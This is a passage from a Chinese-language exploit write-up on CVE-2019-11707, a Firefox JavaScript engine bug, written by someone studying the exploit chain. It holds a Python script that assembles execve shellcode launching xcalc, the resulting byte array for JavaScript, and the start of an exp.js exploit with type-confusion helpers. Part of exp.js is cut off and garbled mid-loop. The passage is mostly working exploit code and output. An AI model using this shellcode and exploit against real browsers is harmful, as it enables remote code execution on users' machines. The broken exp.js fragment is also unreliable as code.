    push   rdi
    push rsp
    pop    rsi
    xor rdx,rdx
    push   rdx
    lea    rdx,[rip+ %d ]
    push   rdx
    push   rsp
    pop    rdx
    mov    al,0x3b
    syscall
    ''' % (cmd_off-0x7, env_off-25)
    shellcode=asm(shellcode).ljust(cmd_off,'x90')
    shellcode+=cmd
    shellcode=shellcode.ljust(env_off,'x00')
    shellcode+=env
    shellcode+='x00'
    print(len(shellcode))
    print(shellcode)
    jsdata='sc = '+str([ord(i) for i in shellcode])+'n'
    print(jsdata)
    with open('shellcode.js','w') as f:
        f.write(jsdata)
        f.close()
执行之后生成一个`shellcode.js` 保存一个`sc` 数组，把这个数组拷贝到要转换成`rwx` 的内存即可
    root@prbv:/var/www/html# python shellcode.py 
    137
    Hx8d=Ix00x001VWT^H1Hx8dx15x00x00TZxb0;x0fx90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90/usr/bin/xcalcx00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00DISPLAY=:0x00
    sc = [72, 141, 61, 73, 0, 0, 0, 72, 49, 246, 86, 87, 84, 94, 72, 49, 210, 82, 72, 141, 21, 101, 0, 0, 0, 82, 84, 90, 176, 59, 15, 5, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 47, 117, 115, 114, 47, 98, 105, 110, 47, 120, 99, 97, 108, 99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 73, 83, 80, 76, 65, 89, 61, 58, 48, 0]
###  exp
完整exp如下
`exp.html`
      Please wait...
`exp.js`
    var conversion_buffer = new ArrayBuffer(8);
    var f64 = new Float64Array(conversion_buffer);
    var i32 = new Uint32Array(conversion_buffer);
    var BASE32 = 0x100000000;
    function f2i(f) {
        f64[0] = f;
        return i32[0] + BASE32 * i32[1];
    }
    function i2f(i) {
        i32[0] = i % BASE32;
        i32[1] = i / BASE32;
        return f64[0];
    }
    function hex(addr){
        return '0x'+addr.toString(16);
    }
    function print(msg) {
        console.log(msg);
    //    document.body.innerText += 'n[+]: '+msg ;
        document.body.innerHTML += '[+]: '+msg ;
    }
    function some(buf,addr){
        buf.jjj=i2f(addr);
    }
    function pwn(){
        buf=[];
        for(let i=0;i' ;
        }
        gen_fake_jsclass(buf7_group_addr);
    }
###  利用效果
运行效果如下
## 小结
这里主要跟着[vigneshsrao](https://vigneshsrao.github.io/writeup/)
的文章调了一下`CVE-2019-11707`，学习了一下`firefox` 的漏洞利用链，
整体的漏洞利用链脑子里也比较清晰了，当然这还是没有sandbox 的情况， 后续要找一个 sandbox 逃逸的来调一波。
## reference